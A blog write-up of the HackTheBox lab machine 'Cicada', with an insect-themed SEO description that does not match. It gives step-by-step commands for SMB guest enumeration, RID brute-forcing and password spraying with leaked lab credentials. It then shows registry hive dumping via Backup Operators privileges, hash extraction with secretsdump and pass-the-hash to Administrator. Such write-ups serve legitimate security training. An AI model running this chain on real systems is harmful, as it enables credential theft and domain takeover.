---
title: "Cicada"
seoTitle: "Cicadas: Nature's Noisy Insect Wonders"
seoDescription: "Explore detailed steps to gain access and escalate privileges in a Windows environment using network and user enumeration techniques"
datePublished: Thu May 15 2025 07:37:49 GMT+0000 (Coordinated Universal Time)
cuid: cmap24rr1002s08jrewom9vdi
slug: cicada
cover: https://cdn.hashnode.com/res/hashnode/image/upload/v1747287551151/8f41343e-b022-4f1c-9245-ade805eecb1c.png
tags: hackthebox

---

IP: **10.129.64.6**

Let’s start with the nmap scan.

```apache
nmap -sC -sV -o nmap 10.129.64.6
```

```bash
Starting Nmap 7.95 ( https://nmap.org ) at 2025-05-15 11:12 IST
Nmap scan report for 10.129.64.6
Host is up (0.17s latency).
Not shown: 988 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2025-05-15 12:43:00Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:CICADA-DC.cicada.htb
| Not valid before: 2024-08-22T20:24:16
|_Not valid after:  2025-08-22T20:24:16
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:CICADA-DC.cicada.htb
| Not valid before: 2024-08-22T20:24:16
|_Not valid after:  2025-08-22T20:24:16
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:CICADA-DC.cicada.htb
| Not valid before: 2024-08-22T20:24:16
|_Not valid after:  2025-08-22T20:24:16
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: cicada.htb0., Site: Default-First-Site-Name)
|_ssl-date: TLS randomness does not represent time
| ssl-cert: Subject: commonName=CICADA-DC.cicada.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1:<unsupported>, DNS:CICADA-DC.cicada.htb
| Not valid before: 2024-08-22T20:24:16
|_Not valid after:  2025-08-22T20:24:16
5985/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
Service Info: Host: CICADA-DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2025-05-15T12:43:42
|_  start_date: N/A
|_clock-skew: 6h59m59s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 102.95 seconds
```

We have a lot of interesting ports open from which we can likely assume it’s a Windows domain controller.

Also, we can see `cicada.htb` it being mentioned many times, so let’s first add it to our hosts file.

```apache
sudo nano /etc/hosts
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1747288542325/6a7d38ec-c82d-446f-8c99-7b81d8762536.png align="center")

As SMB supports more guest authentication so let’s start with enumerating shares.

```apache
nxc smb 10.129.64.6 --shares
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1747288811971/a9eed3af-5008-4e62-b63a-5d02c74304a7.png align="center")

We get an error that the user session is deleted, so let’s specify a non-existing user with an empty password and see if guest authentication is allowed on it or not.

```apache
nxc smb 10.129.64.6 -u "dignitas" -p "" --shares
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1747289334709/7fd13d41-ca3a-4aca-a5b8-560fa77c8cf8.png align="center")

We have two new shares `DEV` and `HR` and we also have READ access on `HR` share.

```apache
smbclient -U 'dignitas' //10.129.64.6/HR
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1747289495536/7fd7c1f6-d62d-4ff3-ab32-b467aa9241b0.png align="center")

So, we have a Notice from HR file, let’s get that to our machine and see the contents of it.

```apache
mget *.txt
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1747289584630/3b691135-12e2-4e26-935b-c9652fcb2110.png align="center")

```apache
cat Notice\ from\ HR.txt
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1747289622659/2fad8196-0030-4399-a86c-0dfd6a00ba33.png align="center")

We’ve been provided with a default password here `Cicada$M6Corpb*@Lp#nZp!8` But we’re unaware of the users.

As we have guest authentication, we can do RID brute-forcing to bruteforce the user id’s from 0-4000.

```apache
nxc smb 10.129.64.6 -u "dignitas" -p "" --rid-brute
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1747289927568/8293b231-c523-4b02-a6d2-2a88b7b16f1e.png align="center")

We got some users, so let’s add that to our list and then start with the password spray.

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1747290049245/a0df4f55-0bc0-4180-bee4-68d3b4f97fd3.png align="center")

```apache
nxc smb 10.129.64.6 -u users.txt -p 'Cicada$M6Corpb*@Lp#nZp!8'
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1747290255831/022585a8-8329-41ba-a9a1-c513c2b3e615.png align="center")

The password is valid for `michael.wrightson`. Let’s enumerate and see if this user has access to `DEV` share.

```apache
nxc smb 10.129.64.6 -u michael.wrightson -p 'Cicada$M6Corpb*@Lp#nZp!8' --shares
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1747290411674/48a011f8-00aa-4d09-b0c7-36e014191d82.png align="center")

Michael doesn’t have any additional share access beyond what the guest user has. Now with LDAP access, we can look for a more complete list of users.

```apache
nxc smb 10.129.64.6 -u michael.wrightson -p 'Cicada$M6Corpb*@Lp#nZp!8' --users
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1747290572732/bd427386-9e7d-4721-ad4f-16f574db6781.png align="center")

We have 8 local users, but the interesting thing is that the user `david.orelious` has a comment that spills his password `aRt$Lp#7t*VQ!3`

Let’s now check the access to the `DEV` Share again.

```apache
nxc smb 10.129.64.6 -u david.orelious -p 'aRt$Lp#7t*VQ!3' --shares
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1747290791814/2a6fd6e2-3050-4f2b-92be-50c4f0f8e3db.png align="center")

Let’s look at the contents inside the `DEV` share.

```apache
smbclient -U 'cicada/david.orelious%aRt$Lp#7t*VQ!3' //10.129.64.6/DEV
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1747291000224/39095641-6620-4d4e-a5fb-73d9c2257272.png align="center")

We have a file name `Backup_script.ps1`. Let’s download it to our machine and see what we have in there.

```apache
mget *.ps1
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1747291071456/abe90520-1bd4-42bd-9ecb-6c3bcc6f919d.png align="center")

```apache
cat Backup_script.ps1
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1747291115176/0b5c472f-3bc4-408e-8d9e-8dbea35757be.png align="center")

So, we have the password for `emily.oscars` i.e. `Q!3@Lp#M6b*7t*Vt`. Let’s see if the creds are valid for WinRM.

```apache
nxc winrm 10.129.64.6 -u emily.oscars -p 'Q!3@Lp#M6b*7t*Vt'
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1747291858373/b1cbf1a6-046f-417b-8ead-5c89f75137e5.png align="center")

Let’s now connect using `evil-winrm`.

```apache
evil-winrm -i 10.129.64.6 -u emily.oscars -p 'Q!3@Lp#M6b*7t*Vt'
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1747292021080/f2f9f8c7-2ce4-4249-a326-2ff621ebc98b.png align="center")

Let’s now get our first flag.

```apache
type C:\Users\emily.oscars.CICADA\Desktop\user.txt
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1747292099242/5c1d749f-b6cf-49aa-917a-6aef1ddff505.png align="center")

Flag: **2b8a749011d596957ba7c3159c1ea4a5**

Let’s now move to the root. Checking the privileges of Emily user.

```apache
net user emily.oscars
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1747293395061/5655260a-6131-4852-9a50-cc6bf1fe60bc.png align="center")

Emily is a member of `Backup Operators` group.

According to [Microsoft docs](https://learn.microsoft.com/en-us/windows-server/identity/ad-ds/manage/understand-security-groups#backup-operators),this group:

> Members of the Backup Operators group can back up and restore all files on a computer, regardless of the permissions that protect those files. Backup Operators also can log on to and shut down the computer. This group can’t be renamed, deleted, or removed. By default, this built-in group has no members, and it can perform backup and restore operations on domain controllers. Members of the following groups can modify Backup Operators group membership: default service Administrators, Domain Admins in the domain, and Enterprise Admins. Members of the Backup Operators group can’t modify the membership of any administrative groups. Although members of this group can’t change server settings or modify the configuration of the directory, they do have the permissions needed to replace files (including operating system files) on domain controllers. Because members of this group can replace files on domain controllers, they’re considered service administrators.

This shows up in the form of the `SeBackupPrivilege` and `SeRestorePrivilege`

```apache
whoami /priv
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1747293539438/b16a7f17-ae7a-46c5-96c2-a0d60453d9fa.png align="center")

Let’s now dump the registry hives to files and exfiltrate them.

```apache
reg save hklm\sam sam
reg save hklm\system system
reg save hklm\security security
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1747293673309/708f3473-7f2c-40cb-9482-da7a986992da.png align="center")

```apache
download sam
download system
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1747294100444/51cc97bb-9d8e-4fd9-b696-280ee120eb00.png align="center")

Let’s now dump the hashes.

```apache
impacket-secretsdump -sam sam -system system LOCAL
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1747294157151/fd127883-c0cc-49a0-a64a-8f6ca6da3450.png align="center")

We got the Administrator hash, let’s use that to log in.

```apache
evil-winrm -i 10.129.64.6 -u administrator -H 2b87e7c93a3e8a0ea4a581937016f341
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1747294367314/673e812f-b919-4a22-b284-18a139618d06.png align="center")

Let’s get our root flag now.

```apache
type C:\Users\Administrator\Desktop\root.txt
```

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1747294407934/57994c67-825f-4c0e-82fb-d17ef234159f.png align="center")

Flag: **8f272a073990777e7c9a3798de37b2d3**

![](https://cdn.hashnode.com/res/hashnode/image/upload/v1747294603560/3a052ef6-bc33-4dec-94e7-5482ebebc7b5.png align="center")